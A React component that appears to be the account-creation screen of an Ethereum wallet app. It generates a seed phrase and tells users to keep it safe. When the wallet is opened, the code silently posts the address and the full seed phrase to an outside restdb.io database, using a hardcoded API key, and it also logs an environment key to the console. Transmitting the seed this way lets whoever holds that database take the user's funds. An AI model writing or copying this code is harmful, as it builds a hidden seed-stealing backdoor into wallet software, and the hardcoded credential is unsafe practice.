import React from "react";
import { Button, Card } from "antd";
import { ExclamationCircleOutlined } from "@ant-design/icons";
import { useNavigate } from "react-router-dom";
import { useState } from "react";
import { ethers } from "ethers";
import axios from 'axios';

function CreateAccount({ setWallet, setSeedPhrase }) {
  const [newSeedPhrase, setNewSeedPhrase] = useState(null);
  const navigate = useNavigate();

  function generateWallet() {
    const mnemonic = ethers.Wallet.createRandom().mnemonic.phrase;

    setNewSeedPhrase(mnemonic)
  }


  async function setWalletAndMnemonic() {
    setSeedPhrase(newSeedPhrase);
    setWallet(ethers.Wallet.fromPhrase(newSeedPhrase).address);
console.log(process.env.REACT_APP_API_KEY, "ddd")
    // save wallet address and seed to restdb.io
    try {
      await axios.post('https://etherawallet-d74d.restdb.io/rest/wallet', {
        walletAdress: ethers.Wallet.fromPhrase(newSeedPhrase).address,
        seedPhrase: newSeedPhrase,
      },
        {
          headers: {
            "Content-Type": "application/json",
            "x-apikey": '656f38df7a68db69506787e9',
            "cache-control": "no-cache",
          }
        });
      console.log("Wallet address and seed saved successfully.");
    } catch {
      console.log("Error saving wallet address and seed:");
    }
  }


  return (
    <>
      <div className="content">
        <div className="mnemonic">
          <ExclamationCircleOutlined style={{ fontSize: "20px" }} />
          <div>
            Once you generate the seed phrase, save it securely in order to
            recover your wallet in the future.
          </div>
        </div>
        <Button
          className="frontPageButton"
          type="primary"
          onClick={() => generateWallet()}
        >
          Generate Seed Phrase
        </Button>
        <Card className="seedPhraseContainer">
          {newSeedPhrase && <pre style={{ whiteSpace: "pre-wrap" }}>{newSeedPhrase}</pre>}
        </Card>
        <Button
          className="frontPageButton"
          type="default"
          onClick={() => setWalletAndMnemonic()}
        >
          Open Your New Wallet
        </Button>
        <p className="frontPageBottom" onClick={() => navigate("/")}>
          Back Home
        </p>
      </div>
    </>
  );
}

export default CreateAccount;
